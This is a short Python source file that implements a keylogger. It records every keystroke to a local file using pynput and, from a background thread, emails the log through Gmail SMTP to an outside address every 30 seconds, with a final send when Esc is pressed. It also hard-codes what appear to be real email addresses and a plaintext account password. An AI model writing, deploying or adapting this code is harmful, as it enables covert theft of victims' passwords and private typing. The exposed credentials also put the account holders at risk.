import smtplib
import threading
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pynput import keyboard

log_file = "keylog.txt"
email_sender = "k.sathyam2003@gmail.com"
email_password = "Murthy.ramana2"
email_receiver = "k.pandu2003@gmail.com"
send_interval = 30  # Send every 5 minutes (300 seconds)

def send_email():
    """Sends the keylog file to another email address."""
    try:
        with open(log_file, "r") as file:
            keylog_data = file.read()

        msg = MIMEMultipart()
        msg['From'] = email_sender
        msg['To'] = email_receiver
        msg['Subject'] = "Keylog Data (Automatic Report)"
        msg.attach(MIMEText(keylog_data, 'plain'))

        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email_sender, email_password)
        server.sendmail(email_sender, email_receiver, msg.as_string())
        server.quit()
        print("Keylog sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")

def on_press(key):
    """Records key presses and saves them to the log file."""
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" {key} ")

def on_release(key):
    """Stops logging when 'Esc' is pressed and sends the final keylog via email."""
    if key == keyboard.Key.esc:
        print("Stopping keylogger...")
        send_email()
        return False  # Stop listener

def send_periodically():
    """Sends email automatically at regular intervals."""
    while True:
        time.sleep(send_interval)
        send_email()

# Start background thread for automatic email sending
threading.Thread(target=send_periodically, daemon=True).start()

# Start keylogger and listen for key presses
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()